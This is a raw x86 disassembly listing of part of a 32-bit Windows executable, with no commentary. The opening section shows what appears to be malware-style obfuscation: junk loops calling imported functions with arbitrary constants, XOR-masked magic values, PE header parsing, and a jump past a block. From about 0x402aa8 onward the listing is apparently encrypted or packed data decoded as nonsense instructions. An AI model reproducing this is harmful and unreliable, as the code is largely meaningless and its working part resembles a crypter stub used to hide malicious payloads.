  4028aa:	push   DWORD PTR [ebp-0x24]
  4028ad:	push   0x43f7
  4028b2:	push   0x38dd
  4028b7:	push   DWORD PTR [ebp-0x10]
  4028ba:	push   0x3246
  4028bf:	push   0x510b
  4028c4:	push   0x8cd7
  4028c9:	push   DWORD PTR [ebp-0xc]
  4028cc:	push   0x63f7
  4028d1:	push   DWORD PTR [ebp-0x10]
  4028d4:	call   DWORD PTR ds:0x42e8bb
  4028da:	cmp    DWORD PTR ds:0x42d000,0x6
  4028e1:	jne    0x4028f4
  4028e7:	mov    ecx,DWORD PTR ds:0x42d000
  4028ed:	dec    ecx
  4028ee:	mov    DWORD PTR ds:0x42d000,ecx
  4028f4:	mov    ecx,DWORD PTR ds:0x42d000
  4028fa:	dec    ecx
  4028fb:	mov    DWORD PTR ds:0x42d000,ecx
  402901:	jmp    0x402880
  402906:	mov    ecx,0x751089b
  40290b:	xor    eax,ecx
  40290d:	cmp    eax,0xf89c85f0
  402912:	jne    0x402941
  402918:	mov    eax,DWORD PTR [ebp+0x8]
  40291b:	push   esi
  40291c:	mov    esi,DWORD PTR [ebp+0x8]
  40291f:	add    esi,DWORD PTR [eax+0x3c]
  402922:	mov    DWORD PTR [ebp+0x8],esi
  402925:	mov    eax,DWORD PTR [ebp-0x4]
  402928:	mov    esi,DWORD PTR [ebp+0x8]
  40292b:	xor    eax,ecx
  40292d:	add    eax,edx
  40292f:	cmp    DWORD PTR [esi+0x54],eax
  402932:	pop    esi
  402933:	je     0x402941
  402939:	mov    eax,DWORD PTR [ebp+0x8]
  40293c:	jmp    0x402948
  402941:	mov    eax,DWORD PTR [ebp-0x4]
  402944:	xor    eax,ecx
  402946:	add    eax,edx
  402948:	leave  
  402949:	ret    0x4
  40294c:	push   ebp
  40294d:	mov    ebp,esp
  40294f:	sub    esp,0x38
  402952:	xor    eax,eax
  402954:	xor    eax,DWORD PTR ds:0x42c00c
  40295a:	xor    DWORD PTR ds:0x42d010,eax
  402960:	mov    DWORD PTR [ebp-0x4],0xf89c8585
  402967:	and    DWORD PTR ds:0x429020,0x0
  402971:	jmp    0x402981
  402976:	mov    eax,ds:0x429020
  40297b:	inc    eax
  40297c:	mov    ds:0x429020,eax
  402981:	cmp    DWORD PTR ds:0x429020,0x12
  402988:	jae    0x4029d7
  40298e:	cmp    DWORD PTR ds:0x429020,0x4
  402995:	jne    0x4029b5
  40299b:	push   0x3575
  4029a0:	push   0x2056
  4029a5:	push   0x7cad
  4029aa:	push   0x3741
  4029af:	call   DWORD PTR ds:0x42e8e7
  4029b5:	cmp    DWORD PTR ds:0x429020,0x3
  4029bc:	jne    0x4029d0
  4029c2:	xor    eax,eax
  4029c4:	add    eax,DWORD PTR ds:0x429020
  4029ca:	inc    eax
  4029cb:	mov    ds:0x429020,eax
  4029d0:	jmp    0x402976
  4029d5:	not    eax
  4029d7:	push   ebx
  4029d8:	mov    DWORD PTR [ebp-0xc],0xf89c8584
  4029df:	mov    eax,DWORD PTR [ebp-0x4]
  4029e2:	add    DWORD PTR ds:0x42900c,0x42a018
  4029ec:	push   esi
  4029ed:	mov    esi,0x751089b
  4029f2:	xor    DWORD PTR ds:0x429018,0x429014
  4029fc:	xor    eax,esi
  4029fe:	sbb    DWORD PTR ds:0x42b000,0x77b
  402a08:	push   edi
  402a09:	mov    DWORD PTR ds:0x429018,0x1e
  402a13:	cmp    DWORD PTR ds:0x429018,0x0
  402a1a:	je     0x402a6e
  402a20:	cmp    DWORD PTR ds:0x429018,0xe
  402a27:	jne    0x402a42
  402a2d:	push   0x6dbc
  402a32:	push   0x42a004
  402a37:	push   0x657a
  402a3c:	call   DWORD PTR ds:0x42e8bf
  402a42:	cmp    DWORD PTR ds:0x429018,0xf
  402a49:	jne    0x402a5c
  402a4f:	mov    edi,DWORD PTR ds:0x429018
  402a55:	dec    edi
  402a56:	mov    DWORD PTR ds:0x429018,edi
  402a5c:	mov    edi,DWORD PTR ds:0x429018
  402a62:	dec    edi
  402a63:	mov    DWORD PTR ds:0x429018,edi
  402a69:	jmp    0x402a13
  402a6e:	mov    edi,0x3272e2
  402a73:	or     DWORD PTR ds:0x42a014,0x429014
  402a7d:	add    eax,edi
  402a7f:	adc    DWORD PTR ds:0x429008,0x42a018
  402a89:	mov    DWORD PTR [ebp-0x1c],eax
  402a8c:	movzx  eax,BYTE PTR ds:0x429010
  402a93:	xor    eax,DWORD PTR ds:0x42b00c
  402a99:	mov    ds:0x429010,eax
  402a9e:	mov    eax,DWORD PTR [ebp+0x14]
  402aa1:	test   eax,eax
  402aa3:	jmp    0x404df8
  402aa8:	retf   
  402aa9:	int    0x38
  402aab:	outs   dx,DWORD PTR ds:[esi]
  402aac:	cmp    cl,BYTE PTR [ebx-0x3abb3675]
  402ab2:	jae    0x402a43
  402ab4:	lods   eax,DWORD PTR ds:[esi]
  402ab5:	pop    esp
  402ab6:	mov    ds:0x7c7c7c05,al
  402abb:	jl     0x402af1
  402abd:	pop    edi
  402abe:	jl     0x402b3c
  402ac0:	adc    eax,0x1139172e
  402ac5:	and    eax,0x32652f13
  402aca:	popa   
  402acb:	pusha  
  402acc:	aas    
  402acd:	fs ins BYTE PTR es:[edi],dx
  402acf:	ins    BYTE PTR es:[edi],dx
  402ad0:	ins    DWORD PTR es:[edi],dx
  402ad1:	xor    al,0xc5
  402ad3:	fdivp  st(1),st
  402ad5:	push   0x42
  402ad7:	arpl   WORD PTR [ecx+0x53],di
  402ada:	stos   BYTE PTR es:[edi],al
  402adb:	jp     0x402b4a
  402add:	push   ecx
  402ade:	iret   
  402adf:	pop    ebp
  402ae0:	dec    esp
  402ae1:	cmp    cl,BYTE PTR [esi+0x577087fc]
  402ae7:	dec    ebp
  402ae8:	jg     0x402b21
  402aea:	mov    ah,BYTE PTR [eax+0x33a4ba7f]
  402af0:	jmp    DWORD PTR cs:[eax-0x22]
  402af4:	cld    
  402af5:	imul   edi,DWORD PTR [edi+0x18],0xffffffed
  402af9:	xor    ebp,ecx
  402afb:	mov    esp,0xd82b87ed
  402b00:	and    DWORD PTR [ecx],0xf
  402b03:	push   ecx
  402b04:	mov    ds:0x6df7c68c,eax
  402b09:	fld    QWORD PTR [esi]
  402b0b:	(bad)  
  402b0c:	or     ah,bh
  402b0e:	and    BYTE PTR [edx],dl
  402b10:	inc    edx
  402b11:	push   cs
  402b12:	and    BYTE PTR [ebx+0x62],ah
  402b15:	mov    cl,0xaf
  402b17:	sub    ebx,DWORD PTR [ecx+0x5]
  402b1a:	mov    al,ds:0x2341e1ff
  402b1f:	jbe    0x402b55
  402b21:	ret    0xf153
  402b24:	sbb    al,0xfc
  402b26:	jb     0x402ae1
  402b28:	jnp    0x402b07
  402b2a:	xchg   edx,eax
  402b2b:	pop    edi
  402b2c:	cmp    DWORD PTR [ecx+0x49841607],0xb
  402b33:	cwde   
  402b34:	ds je  0x402ac2
  402b37:	add    ebx,esp
  402b39:	sub    eax,0x4b368d54
  402b3e:	push   esi
  402b3f:	sti    
  402b40:	iret   
  402b41:	mov    WORD PTR [ecx],fs
  402b43:	or     edx,0x6982ceb7
  402b49:	out    0x45,al
  402b4b:	push   esp
  402b4c:	dec    esi
  402b4d:	push   cs
  402b4e:	cmp    BYTE PTR [ebx],cl
  402b50:	xor    BYTE PTR [ebx],bl
  402b52:	lods   eax,DWORD PTR ds:[esi]
  402b53:	inc    ebx
  402b54:	int3   
  402b55:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402b56:	dec    edx
  402b57:	fiadd  DWORD PTR [esi]
  402b59:	push   eax
  402b5a:	std    
  402b5b:	push   esp
  402b5c:	push   eax
  402b5d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402b5e:	icebp  
  402b5f:	bound  edi,QWORD PTR [edi-0x22e6bb0e]
  402b65:	mov    ebx,0x33b782c1
  402b6a:	in     eax,0x15
  402b6c:	scas   al,BYTE PTR es:[edi]
  402b6d:	fs pushf 
  402b6f:	nop
  402b70:	ins    DWORD PTR es:[edi],dx
  402b71:	push   ds
  402b72:	fwait
  402b73:	adc    dh,cl
  402b75:	or     DWORD PTR [ebx],eax
  402b77:	jmp    0x402b00
  402b79:	sub    BYTE PTR [eax+0x1c],dh
  402b7c:	ds inc ebx
  402b7e:	sbb    DWORD PTR [ecx-0x7b],esi
  402b81:	hlt    
  402b82:	adc    DWORD PTR [eax+0x5a],ebp
  402b85:	outs   dx,BYTE PTR ds:[esi]
  402b86:	pusha  
  402b87:	mov    ebx,0x8120c9e1
  402b8c:	cmp    edx,DWORD PTR ds:0x52dae887
  402b92:	sbb    BYTE PTR [ebx+0x44],0x9b
  402b96:	jmp    0x964e7d5b
  402b9b:	loop   0x402bfb
  402b9d:	dec    esp
  402b9e:	mov    al,ds:0x5fff13ef
  402ba3:	or     DWORD PTR [ebp+0x14fcc24e],ebx
  402ba9:	jp     0x402bc0
  402bab:	mov    bl,0x2f
  402bad:	outs   dx,DWORD PTR ds:[esi]
  402bae:	int3   
  402baf:	pop    ebp
  402bb0:	clc    
  402bb1:	ror    BYTE PTR [esi],cl
  402bb3:	(bad)  
  402bb4:	daa    
  402bb5:	int3   
  402bb6:	bound  ebp,QWORD PTR [eax+ecx*8+0x7532fea2]
  402bbd:	jmp    0xcd473b44
  402bc2:	inc    ecx
  402bc3:	not    DWORD PTR [ecx]
  402bc5:	pop    ecx
  402bc6:	add    al,0xf9
  402bc8:	ss push ebx
  402bca:	dec    ebp
  402bcb:	psubsb mm3,QWORD PTR [ebx]
  402bce:	or     eax,eax
  402bd0:	mov    bl,0x3
  402bd2:	jne    0x402b5f
  402bd4:	hlt    
  402bd5:	repz and dh,BYTE PTR [ebp-0x6f73cfd3]
  402bdc:	loope  0x402b80
  402bde:	cmp    DWORD PTR ds:[ecx+0x24],edx
  402be2:	sbb    ebp,DWORD PTR [eax+0x7f]
  402be5:	out    dx,eax
  402be6:	imul   edi,ecx,0xd7fddc58
  402bec:	idiv   DWORD PTR [eax+0x6ee48694]
  402bf2:	xor    eax,0xedd28a8e
  402bf7:	jp     0x402c10
  402bf9:	jmp    0x864bf100
  402bfe:	(bad)  
  402bff:	pop    ecx
  402c00:	aad    0xaa
  402c02:	push   edi
  402c03:	in     eax,dx
  402c04:	sub    eax,0x8caf7c6b
  402c09:	daa    
  402c0a:	and    ebx,eax
  402c0c:	cs xchg edx,eax
  402c0e:	dec    ecx
  402c0f:	jb     0x402bab
  402c11:	leave  
  402c12:	fs pop ds
  402c14:	mov    esp,0xb493429b
  402c19:	cdq    
  402c1a:	sub    ch,BYTE PTR [edi-0x6a0ed81a]
  402c20:	arpl   WORD PTR [edx],ax
  402c22:	retf   0xebd
  402c25:	fucom  st(3)
  402c27:	repz dec edi
  402c29:	pusha  
  402c2a:	lahf   
  402c2b:	fnstenv [edx-0x3ad0e9f6]
  402c31:	je     0x402bf9
  402c33:	cwde   
  402c34:	retf   0x594
  402c37:	mov    al,BYTE PTR [eax+0x6b176573]
  402c3d:	ficom  WORD PTR [ebx]
  402c3f:	retf   
  402c40:	mov    eax,0x8dc464d9
  402c45:	icebp  
  402c46:	or     ebp,DWORD PTR [esi-0x44]
  402c49:	fmul   QWORD PTR [esi+edi*2]
  402c4c:	and    eax,0x6cc12937
  402c51:	or     DWORD PTR [eax+ecx*1],ebp
  402c54:	cmp    eax,0xc1751398
  402c59:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402c5a:	xchg   edi,eax
  402c5b:	mov    dl,BYTE PTR [esi+esi*1+0x3c38301c]
  402c62:	es mov bl,0x6a
  402c65:	or     BYTE PTR [ecx],dl
  402c67:	sbb    bh,al
  402c69:	jmp    0xe7caa3f8
  402c6e:	int3   
  402c6f:	add    eax,DWORD PTR ss:0xc19227b2
  402c76:	dec    edi
  402c77:	fdivr  QWORD PTR [edi]
  402c79:	or     dl,BYTE PTR [edx+0x3c]
  402c7c:	into   
  402c7d:	lock daa 
  402c7f:	pop    ss
  402c80:	mov    DWORD PTR [ecx],eax
  402c82:	adc    eax,0xe050fb47
  402c87:	pop    ebp
  402c88:	fsub   DWORD PTR ds:0x67e619cd
  402c8e:	jnp    0x402c54
  402c90:	jbe    0x402cf0
  402c92:	ins    DWORD PTR es:[edi],dx
  402c93:	cmp    BYTE PTR [ebp+0x3c],0x78
  402c97:	mov    BYTE PTR [ecx+0x3afc7281],cl
  402c9d:	jo     0x402d13
  402c9f:	arpl   bp,cx
  402ca1:	pop    eax
  402ca2:	xor    edx,DWORD PTR [esi+eiz*8-0x38]
  402ca6:	int3   
  402ca7:	sub    eax,0xcb5856d8
  402cac:	idiv   BYTE PTR ds:0xb84cbbd2
  402cb2:	in     eax,0x91
  402cb4:	into   
  402cb5:	aam    0x35
  402cb7:	mov    ecx,0x5edb57d9
  402cbd:	enter  0x2342,0x8f
  402cc1:	call   0xfc50:0xd978654c
  402cc8:	push   ebp
  402cc9:	push   esp
  402cca:	popf   
  402ccb:	sahf   
  402ccc:	shl    edi,cl
  402cce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402ccf:	(bad)  
  402cd0:	push   0xffffff93
  402cd2:	scas   eax,DWORD PTR es:[edi]
  402cd3:	inc    eax
  402cd4:	loopne 0x402d37
  402cd6:	scas   eax,DWORD PTR es:[edi]
  402cd7:	stos   BYTE PTR es:[edi],al
  402cd8:	add    eax,DWORD PTR [ecx]
  402cda:	mov    edi,0x7ac8dd48
  402cdf:	sbb    al,0x49
  402ce1:	cmp    ebp,DWORD PTR [ecx-0x2e7184f]
  402ce7:	not    DWORD PTR [edx+eax*8-0x7a]
  402ceb:	mov    eax,ds:0x791c550d
  402cf0:	adc    DWORD PTR ds:0x8bd85a3d,edx
  402cf6:	cmc    
  402cf7:	jbe    0x402c8e
  402cf9:	push   0xffffffe8
  402cfb:	pusha  
  402cfc:	and    bl,dh
  402cfe:	pop    ds
  402cff:	stc    
  402d00:	out    0x8e,eax
  402d02:	(bad)  
  402d03:	fwait
  402d04:	adc    edi,edx
  402d06:	mov    eax,0x88201e64
  402d0b:	sub    dl,BYTE PTR [eax+0x682bcd99]
  402d11:	sub    ecx,ecx
  402d13:	pop    ecx
  402d14:	jp     0x402d8d
  402d16:	fnstsw WORD PTR [ecx-0x1fd20c0f]
  402d1c:	xchg   ecx,eax
  402d1d:	jl     0x402d4c
  402d1f:	xchg   edx,eax
  402d20:	pop    ss
  402d21:	leave  
  402d22:	xchg   edi,eax
  402d23:	push   edi
  402d24:	xchg   BYTE PTR [eax+esi*2],al
  402d27:	call   0x4d66:0xcda9fae3
  402d2e:	stc    
  402d2f:	xchg   esi,eax
  402d30:	(bad)  
  402d31:	jno    0x402d62
  402d33:	mov    dl,0x99
  402d35:	jecxz  0x402d31
  402d37:	jae    0x402d0b
  402d39:	outs   dx,BYTE PTR ds:[esi]
  402d3a:	jns    0x402d62
  402d3c:	nop
  402d3d:	cmp    dh,BYTE PTR [ecx-0x26]
  402d40:	xchg   esi,eax
  402d41:	mov    dh,0x9f
  402d43:	mov    dl,0x4b
  402d45:	and    BYTE PTR [esp+edx*2-0x61],bh
  402d49:	cwde   
  402d4a:	xor    ebp,eax
  402d4c:	pop    edi
  402d4d:	lock or bl,BYTE PTR [edi-0x19ed4f5a]
  402d54:	hlt    
  402d55:	pop    ebx
  402d56:	dec    ebx
  402d57:	adc    ebp,DWORD PTR [ebx]
  402d59:	test   al,0x2b
  402d5b:	shl    BYTE PTR [ebp-0x69],1
  402d5e:	lahf   
  402d5f:	out    dx,eax
  402d60:	pop    ebp
  402d61:	aas    
  402d62:	arpl   WORD PTR [esi+ebp*4-0x3d85de7c],si
  402d69:	pop    ecx
  402d6a:	dec    ecx
  402d6b:	xor    ebx,ecx
  402d6d:	sub    BYTE PTR [edx+ebp*2],0x64
  402d71:	test   DWORD PTR [ebp-0x174f2a2b],esi
  402d77:	bound  esi,QWORD PTR [eax]
  402d79:	scas   eax,DWORD PTR es:[edi]
  402d7a:	pusha  
  402d7b:	cld    
  402d7c:	push   cs
  402d7d:	jo     0x402d59
  402d7f:	(bad)  
  402d80:	push   0xb163425e
  402d85:	push   ebp
  402d86:	and    al,0x24
  402d88:	call   0xbe38:0x3444ac7c
  402d8f:	mov    eax,ds:0x3cd7829a
  402d94:	mov    dl,cl
  402d96:	ret    
  402d97:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402d98:	and    DWORD PTR [edi+0x74b5ac4e],0xffffffe1
  402d9f:	mov    al,ds:0xaa09f49e
  402da4:	mov    cs,WORD PTR [ebx-0x64]
  402da7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402da8:	pop    ss
  402da9:	fs pop esi
  402dab:	pop    ds
  402dac:	cdq    
  402dad:	shl    DWORD PTR [edx-0x192929e6],1
  402db3:	rcl    ch,cl
  402db5:	lahf   
  402db6:	outs   dx,BYTE PTR ds:[esi]
  402db7:	xchg   edx,eax
  402db8:	mov    ds:0x66749e00,al
  402dbd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402dbe:	inc    DWORD PTR [ecx]
  402dc0:	push   ebx
  402dc1:	sub    ebp,ebx
  402dc3:	scas   eax,DWORD PTR es:[edi]
  402dc4:	mov    ch,0x39
  402dc6:	or     dh,dh
  402dc8:	mov    eax,0x6998f484
  402dcd:	push   ds
  402dce:	cmp    eax,0x70c04d0a
  402dd3:	jo     0x402db9
  402dd5:	jne    0x402d57
  402dd7:	adc    DWORD PTR [esi],0xffffffdd
  402dda:	nop
  402ddb:	jg     0x402d99
  402ddd:	daa    
  402dde:	lods   eax,DWORD PTR ds:[esi]
  402ddf:	sbb    BYTE PTR ds:0x472953cd,al
  402de5:	iret   
  402de6:	aaa    
  402de7:	xor    al,0x18
  402de9:	pop    ebp
  402dea:	add    eax,0xa82e6ea1
  402def:	inc    esp
  402df0:	push   edi
  402df1:	sbb    DWORD PTR [esi+eiz*4+0x13821f6e],esi
  402df8:	mov    ds:0xf5ee979f,al
  402dfd:	cdq    
  402dfe:	test   al,0x75
  402e00:	lods   eax,DWORD PTR ds:[esi]
  402e01:	repnz (bad) 
  402e03:	cli    
  402e04:	adc    edi,DWORD PTR [eax+0x57]
  402e07:	repnz sbb BYTE PTR [eax],cl
  402e0a:	cld    
  402e0b:	loopne 0x402e52
  402e0d:	push   ebp
  402e0f:	(bad)  
  402e10:	push   0x4bfaf60
  402e15:	pop    ebp
  402e16:	das    
  402e17:	xchg   esp,eax
  402e18:	pop    esp
  402e19:	mov    cl,0x38
  402e1b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402e1c:	les    ebx,FWORD PTR ds:0xf4fb025d
  402e22:	and    BYTE PTR [esi+0x24],ch
  402e25:	clc    
  402e26:	scas   al,BYTE PTR es:[edi]
  402e27:	pop    edi
  402e28:	lahf   
  402e29:	aad    0xc2
  402e2b:	cli    
  402e2c:	add    BYTE PTR [eax],ah
  402e2e:	popf   
  402e2f:	push   ecx
  402e30:	xchg   esp,eax
  402e31:	and    edi,DWORD PTR [ebx+0x37]
  402e34:	retf   
  402e35:	mov    ds:0x4721282d,al
  402e3a:	dec    ecx
  402e3b:	and    eax,0xd5649520
  402e40:	jo     0x402ebe
  402e42:	add    ebp,edi
  402e44:	jnp    0x402e6b
  402e46:	cmp    BYTE PTR [edi-0x71d3a684],0x47
  402e4d:	imul   ecx,DWORD PTR [ecx],0xddfa7dc2
  402e53:	pop    esp
  402e54:	or     bh,cl
  402e56:	mov    al,0xb2
  402e58:	or     bh,ah
  402e5a:	cmc    
  402e5b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402e5c:	xor    dh,BYTE PTR [ecx]
  402e5e:	(bad)  
  402e5f:	in     al,0x1f
  402e61:	stc    
  402e62:	fisub  WORD PTR [esi]
  402e64:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402e65:	adc    edx,0x6c
  402e68:	cs or  al,0x8f
  402e6b:	mov    eax,0x3be1ab0f
  402e70:	push   ds
  402e71:	out    dx,eax
  402e72:	or     eax,0x60da4117
  402e77:	add    edx,eax
  402e79:	pushf  
  402e7a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402e7b:	pop    edx
  402e7c:	lock wrmsr 
  402e7f:	bound  ecx,QWORD PTR [ebx+esi*1+0xa]
  402e83:	xchg   esp,eax
  402e84:	sbb    al,BYTE PTR [esi+0x39bed9a2]
  402e8a:	cs xchg esp,eax
  402e8c:	ins    DWORD PTR es:[edi],dx
  402e8d:	sbb    BYTE PTR cs:[esi],ah
  402e90:	ins    BYTE PTR es:[edi],dx
  402e91:	dec    eax
  402e92:	or     ecx,DWORD PTR [esi+ebp*4]
  402e95:	cli    
  402e96:	fsubr  QWORD PTR [edi+eiz*1+0x1d]
  402e9a:	inc    edx
  402e9b:	out    0x7b,eax
  402e9d:	xor    eax,0xbc37b22
  402ea2:	or     esi,edx
  402ea4:	ds push edi
  402ea6:	or     ah,BYTE PTR [eax]
  402ea8:	cli    
  402ea9:	xor    al,0xea
  402eab:	adc    DWORD PTR [ebp+0x75],edx
  402eae:	idiv   BYTE PTR [eax-0x56]
  402eb1:	push   edx
  402eb2:	js     0x402f02
  402eb4:	pop    ds
  402eb5:	fcmovb st,st(1)
  402eb7:	inc    di
  402eb9:	call   0x751c1e42
  402ebe:	mov    DWORD PTR [eax-0x69],esi
  402ec1:	cmp    DWORD PTR [eax-0x2],0x6b
  402ec5:	or     DWORD PTR [esi+0x538c4a93],edx
  402ecb:	popf   
  402ecc:	sbb    BYTE PTR [ecx+esi*1],al
  402ecf:	inc    ebp
  402ed0:	les    ebx,FWORD PTR [edx+esi*1+0x53]
  402ed4:	cdq    
  402ed5:	test   DWORD PTR [esi],ecx
  402ed7:	jge    0x402ef4
  402ed9:	pop    es
  402eda:	fucomip st,st(5)
  402edc:	ins    BYTE PTR es:[edi],dx
  402edd:	sar    DWORD PTR [ebp-0x78],cl
  402ee0:	int3   
  402ee1:	cmc    
  402ee2:	mov    edi,0x75db5349
  402ee7:	adc    al,0x1f
  402ee9:	mov    al,0xba
  402eeb:	jne    0x402eb9
  402eed:	sti    
  402eee:	lods   al,BYTE PTR ds:[esi]
  402eef:	fimul  WORD PTR [eax+0x31]
  402ef2:	mov    ch,0x12
  402ef4:	gs inc eax
  402ef6:	add    ecx,edx
  402ef8:	(bad)  
  402ef9:	mov    bh,0xf
  402efb:	repz lea esp,[ebx+0x49]
  402eff:	sub    ah,BYTE PTR [edx+0x71]
  402f02:	xor    eax,0x206831b0
  402f07:	jmp    0x402f70
  402f09:	test   al,0x69
  402f0b:	push   0xfffffff9
  402f0d:	rcr    BYTE PTR [ecx],1
  402f0f:	mov    BYTE PTR ds:0xa40b0f43,bh
  402f15:	pop    ecx
  402f16:	xor    edi,DWORD PTR [ecx+0x362ec5c4]
  402f1c:	sub    ebp,DWORD PTR [edi+edx*8]
  402f1f:	add    ebp,DWORD PTR [esi]
  402f21:	sbb    ebx,esp
  402f23:	cmc    
  402f24:	dec    esi
  402f25:	jbe    0x402ec1
  402f27:	or     edi,DWORD PTR [edi+esi*4+0x127819f4]
  402f2e:	daa    
  402f2f:	popa   
  402f30:	fidivr WORD PTR [eax-0xdc0fa98]
  402f36:	jno    0x402f41
  402f38:	xchg   edi,eax
  402f39:	sbb    bl,BYTE PTR [eax-0x51]
  402f3c:	jae    0x402f76
  402f3e:	mov    ch,0x5d
  402f40:	call   0x241908f5
  402f45:	sub    DWORD PTR [ebx+0x2f],edx
  402f48:	ins    BYTE PTR es:[edi],dx
  402f49:	mov    esi,0xa1834288
  402f4e:	aaa    
  402f4f:	popa   
  402f50:	loope  0x402f5b
  402f52:	enter  0x22b9,0x71
  402f56:	xor    esi,DWORD PTR [ecx+ebp*2-0x28e910e1]
  402f5d:	out    dx,al
  402f5e:	(bad)  
  402f5f:	stos   DWORD PTR es:[edi],eax
  402f60:	ret    0xa285
  402f63:	or     eax,0x8e47808b
  402f68:	pop    esi
  402f69:	aaa    
  402f6a:	mov    dh,0xd6
  402f6c:	or     al,0xd
  402f6f:	pop    es
  402f70:	pop    eax
  402f71:	loop   0x402f91
  402f73:	xchg   esp,eax
  402f74:	shl    BYTE PTR [ecx+0x62],cl
  402f77:	nop
  402f78:	icebp  
  402f79:	rcr    esi,1
  402f7b:	sub    DWORD PTR [ebp-0x48],0xc374e2ad
  402f82:	lahf   
  402f83:	fwait
  402f84:	into   
  402f85:	mov    al,ds:0x81ad5232
  402f8a:	xchg   ebp,eax
  402f8b:	ins    BYTE PTR es:[edi],dx
  402f8c:	xlat   BYTE PTR ds:[ebx]
  402f8d:	(bad)  
  402f8f:	repnz add al,0x6
  402f92:	adc    eax,0xa6d063e4
  402f97:	mov    edi,0xad4fcb61
  402f9c:	hlt    
  402f9d:	mov    WORD PTR [edi],gs
  402f9f:	mov    ss,WORD PTR [ebp+ebp*2+0x6edcdfae]
  402fa6:	arpl   WORD PTR [ebx-0x7d],cx
  402fa9:	push   cs
  402faa:	xor    al,0x75
  402fac:	mov    ecx,0x4828900b
  402fb1:	push   ebp
  402fb2:	mov    bh,0x6d
  402fb4:	push   0xe7af90b5
  402fb9:	dec    edi
  402fba:	pop    ecx
  402fbb:	stc    
  402fbc:	scas   eax,DWORD PTR es:[edi]
  402fbd:	cmp    bh,ah
  402fbf:	xor    dl,cl
  402fc1:	mov    edi,0x7ac009c9
  402fc6:	inc    BYTE PTR [ebx]
  402fc8:	hlt    
  402fc9:	in     al,dx
  402fca:	push   0x24431dd5
  402fcf:	(bad)  
  402fd0:	sti    
  402fd1:	sub    BYTE PTR [ecx+0x6a],ch
  402fd4:	into   
  402fd5:	pusha  
  402fd6:	mov    ah,0x9
  402fd8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402fd9:	js     0x40302e
  402fdb:	sbb    ecx,ebp
  402fdd:	test   eax,0x61db5f27
  402fe2:	mov    eax,ds:0x1417a320
  402fe7:	arpl   WORD PTR [ecx+0x1f],cx
  402fea:	sti    
  402feb:	mov    edi,fs
  402fed:	push   esp
  402fee:	inc    esi
  402fef:	call   0xbb61874
  402ff4:	loope  0x403051
  402ff6:	std    
  402ff7:	jae    0x402fc2
  402ff9:	aaa    
  402ffa:	xor    edi,0x69718ba5
  403000:	ds mov bh,ah
  403003:	pop    ebp
  403004:	(bad)  [edx]
  403006:	inc    edx
  403007:	cli    
  403008:	push   ss
  403009:	and    BYTE PTR [ebx],ch
  40300b:	push   edx
  40300c:	sub    DWORD PTR [edx],0xda88e0db
  403012:	fs sbb edi,0x5dc70c73
  403019:	gs ss add al,0x7c
  40301d:	jge    0x403023
  40301f:	(bad)  
  403020:	retf   
  403021:	xchg   esi,eax
  403022:	pop    ebx
  403023:	push   ecx
  403024:	sub    DWORD PTR [ebp-0x2f],0x50
  403028:	jmp    DWORD PTR fs:[edx-0x25f353f4]
  40302f:	push   ss
  403030:	enter  0x4ab0,0xf6
  403034:	es xor edx,ecx
  403037:	pop    ebp
  403038:	sbb    al,0xda
  40303a:	dec    edi
  40303b:	test   DWORD PTR [si-0x69],esi
  40303f:	cld    
  403040:	jno    0x403004
  403042:	push   esi
  403043:	xor    al,al
  403045:	jb     0x4030bc
  403047:	sti    
  403048:	(bad)
  40304b:	cdq    
  40304c:	fcomp  DWORD PTR [ebx+0x3e]
  40304f:	adc    DWORD PTR [edi-0x7d4c57a7],edi
  403055:	dec    ebp
  403056:	jne    0x403096
  403058:	or     BYTE PTR [ecx],0x82
  40305b:	cdq    
  40305c:	mov    al,ds:0xe5bb6d21
  403061:	pop    es
  403062:	jae    0x403028
  403064:	stos   DWORD PTR es:[edi],eax
  403065:	fist   WORD PTR [ecx+eiz*8+0x18]
  403069:	stc    
  40306a:	ret    
  40306b:	ins    BYTE PTR es:[edi],dx
  40306c:	in     eax,0x35
  40306e:	or     bh,dh
  403070:	pop    esp
  403071:	out    dx,al
  403072:	mov    cs,WORD PTR [ebx-0x55]
  403075:	inc    edi
  403076:	mov    edx,0xdd0cb298
  40307b:	mov    ds,WORD PTR [edx+0x7b]
  40307e:	push   cs
  40307f:	adc    eax,0x4d779ce8
  403084:	dec    esp
  403085:	push   eax
  403086:	retf   
  403087:	fldcw  WORD PTR [edi]
  403089:	ins    DWORD PTR es:[edi],dx
  40308a:	aam    0x7c
  40308c:	aad    0x83
  40308e:	outs   dx,DWORD PTR ds:[esi]
  40308f:	pop    ecx
  403090:	lahf   
  403091:	mov    esi,0x42c29c3d
  403096:	sbb    BYTE PTR [edx],ch
  403098:	test   BYTE PTR [esp],0xb7
  40309c:	ss enter 0x6787,0x6a
  4030a1:	and    esi,DWORD PTR [ecx]
  4030a3:	inc    ecx
  4030a4:	sub    edx,ebp
  4030a6:	jo     0x403124
  4030a8:	push   ebx
  4030a9:	push   edx
  4030aa:	cmp    DWORD PTR [edi-0x2a],eax
  4030ad:	and    dh,bh
  4030af:	imul   BYTE PTR ds:0xeb521bba
  4030b5:	sbb    eax,0xd17ae181
  4030ba:	xlat   BYTE PTR ds:[ebx]
  4030bb:	push   esp
  4030bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4030bd:	inc    ebx
  4030be:	cmp    bl,al
  4030c0:	xor    BYTE PTR [ebx-0x78],dh
  4030c3:	out    0xb4,al
  4030c5:	mov    ah,0x27
  4030c7:	fist   DWORD PTR [edi+0x1d]
  4030ca:	xor    esp,DWORD PTR [esi+eiz*8-0x5e74d871]
  4030d1:	and    al,0x94
  4030d3:	sahf   
  4030d4:	repz add al,0xd4
  4030d7:	mov    esi,DWORD PTR [edi+0x13dd2d9]
  4030dd:	dec    eax
  4030de:	fsubr  QWORD PTR [ebx+0x140d9fe3]
  4030e4:	mov    WORD PTR [ecx+eiz*4],fs
